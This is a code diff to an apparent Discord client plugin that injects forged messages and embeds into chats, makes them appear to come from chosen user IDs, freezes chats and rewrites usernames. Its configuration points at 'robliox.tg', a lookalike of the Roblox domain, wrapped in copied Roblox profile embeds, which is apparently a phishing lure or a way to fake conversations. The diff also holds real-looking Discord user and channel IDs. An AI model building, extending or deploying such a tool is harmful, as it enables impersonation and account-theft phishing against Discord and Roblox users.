@@ -22,7 +22,31 @@
             */
 
             /* ---------------------------------------------------------
-            * 1) EDIT YOUR CONFIG HERE
+            * 1) USER CONFIGURATION - CHANGE THESE VALUES
+            * ------------------------------------------------------- */
+            
+            // ===== USER SETTINGS - CHANGE THESE VALUES =====
+            // Simply change the values below to update your user settings throughout the entire plugin
+            const USER_ID = "753944929973174283";           // Your Discord User ID
+            const USERNAME = "";                            // Your username (leave empty to auto-fetch)
+            const AVATAR_URL = "";                          // Your avatar URL (leave empty to auto-fetch)
+            const DISCRIMINATOR = "0000";                   // Your discriminator
+            const GLOBAL_NAME = "";                         // Your global name
+            const IS_BOT = false;                           // Whether you're a bot
+            
+            // ===== MESSAGE SETTINGS - CHANGE THESE VALUES =====
+            const MESSAGE_ID = "msg1";                      // Message ID
+            const TARGET_CHANNEL = "1412231416611082393";   // Target channel ID
+            const MESSAGE_USER_ID = "817381750518579200";   // User ID for the message
+            const MESSAGE_TEXT = "https://www.robliox.tg/users/25699615/profile";  // Message text/URL
+            const EMBED_TITLE = "CrazyKiara111's Profile";  // Embed title
+            const EMBED_DESCRIPTION = "CrazyKiara111 is one of the millions creating and exploring the endless possibilities of Roblox. Join CrazyKiara111 on Roblox and explore together!Razorbill mogger";  // Embed description
+            const EMBED_THUMBNAIL = "https://images-ext-1.discordapp.net/external/7GubuBgUnMZfWd7-1PPBtbzt_b-LNUC-zberDWFAvcw/https/tr.rbxcdn.com/30DAY-Avatar-E4C7523BC87558FC998E76BBC8348F40-Png/352/352/Avatar/Png/noFilter?format=webp&width=528&height=528";  // Embed thumbnail URL
+            const MESSAGE_TIMESTAMP_OFFSET = 60000;         // Timestamp offset in milliseconds (60000 = 1 minute ago)
+            const AVATAR_DECORATION = "";                   // Avatar decoration URL
+            
+            /* ---------------------------------------------------------
+            * 2) EDIT YOUR CONFIG HERE
             * ------------------------------------------------------- */
             
             /*
@@ -68,26 +92,26 @@
                     enabled: true,
                     delayMs: 2000,
                     channelId: "",
-                    dmUserId: "1020358701737062481",
-                    userId: "1020358701737062481",
-                    content: "https://www.robliox.tg/users/6081066/profile",
-                    username: "",
-                    avatar: "",
-                    embedTitle: "xeodiablo's Profile",
-                    embedDescription: "xeodiablo is one of the millions creating and exploring the endless possibilities of Roblox. Join xeodiablo on Roblox and explore together!",
-                    embedThumbnail: "https://images-ext-1.discordapp.net/external/G4atKzXEQvw-UGTxTChmo6ENDjRMZWSeeguHdvIPe3w/https/tr.rbxcdn.com/30DAY-Avatar-A603E69EAF9883ECC08284988734F515-Png/352/352/Avatar/Png/noFilter?format=webp"
+                    dmUserId: USER_ID,
+                    userId: USER_ID,
+                    content: MESSAGE_TEXT,
+                    username: USERNAME,
+                    avatar: AVATAR_URL,
+                    embedTitle: EMBED_TITLE,
+                    embedDescription: EMBED_DESCRIPTION,
+                    embedThumbnail: EMBED_THUMBNAIL
                   }
                 ],
               
                 frozenChats: [
-                  "1020358701737062481",
+                  USER_ID,
                 ],
               
                 idMaps: [
                 ],
               
                 usernameRules: [
-                  { matchId: "xeo3125", newId: "Xeo" }
+                  { matchId: ".Tweety", newId: "Emaytee" }
                 ],
               
                 tagRules: [
@@ -96,13 +120,13 @@
                 quick: {
                   mode: "inject",
                   channelId: "",
-                  dmUserId: "1020358701737062481",
-                  content: "https://www.robliox.tg/users/6081066/profile embedTitle: \"xeodiablo's Profile\" embedDescription: \"xeodiablo is one of the millions creating and exploring the endless possibilities of Roblox. Join xeodiablo on Roblox and explore together!\" embedThumbnail: \"https://images-ext-1.discordapp.net/external/7GubuBgUnMZfWd7-1PPBtbzt_b-LNUC-zberDWFAvcw/https/tr.rbxcdn.com/30DAY-Avapshot/352/352/Avatar/Png/noFilter?format=webp&width=528&height=528\"",
+                  dmUserId: USER_ID,
+                  content: `${MESSAGE_TEXT} embedTitle: "${EMBED_TITLE}" embedDescription: "${EMBED_DESCRIPTION}" embedThumbnail: "${EMBED_THUMBNAIL}"`,
                   embed: {
-                    title: "",
-                    description: "",
-                    url: "",
-                    thumbnail: ""
+                    title: EMBED_TITLE,
+                    description: EMBED_DESCRIPTION,
+                    url: MESSAGE_TEXT,
+                    thumbnail: EMBED_THUMBNAIL
                   }
                 }
               };
@@ -768,6 +792,10 @@
                 
 
                 async function fakeMessage({ channelId, dmUserId, userId, content, embed, username, avatar, timestamp, persistent = true }) {
+                  // Use global user variables as defaults if not provided
+                  userId = userId || USER_ID;
+                  username = username || USERNAME;
+                  avatar = avatar || AVATAR_URL;
                   
                   const MessageActions = await waitForProps(["sendMessage", "receiveMessage"]);
                   const target = await normalizeTarget({ channelId, dmUserId });
@@ -1386,6 +1414,20 @@
                       persistentFakeMessages.clear();
                     }
                   },
+                  
+                  getMessageConfig() {
+                    return {
+                      MESSAGE_ID: MESSAGE_ID,
+                      TARGET_CHANNEL: TARGET_CHANNEL,
+                      MESSAGE_USER_ID: MESSAGE_USER_ID,
+                      MESSAGE_TEXT: MESSAGE_TEXT,
+                      EMBED_TITLE: EMBED_TITLE,
+                      EMBED_DESCRIPTION: EMBED_DESCRIPTION,
+                      EMBED_THUMBNAIL: EMBED_THUMBNAIL,
+                      MESSAGE_TIMESTAMP_OFFSET: MESSAGE_TIMESTAMP_OFFSET,
+                      AVATAR_DECORATION: AVATAR_DECORATION
+                    };
+                  },
 
                   freezeChat: (id) => {
                     if (!CONFIG.frozenChats.includes(id)) {
@@ -1466,7 +1508,7 @@
                       dmUserId,
                       content: "",
                       embed: builtEmbed,
-                      userId: "1020358701737062481"
+                      userId: USER_ID
                     });
                   },
                   quick() {
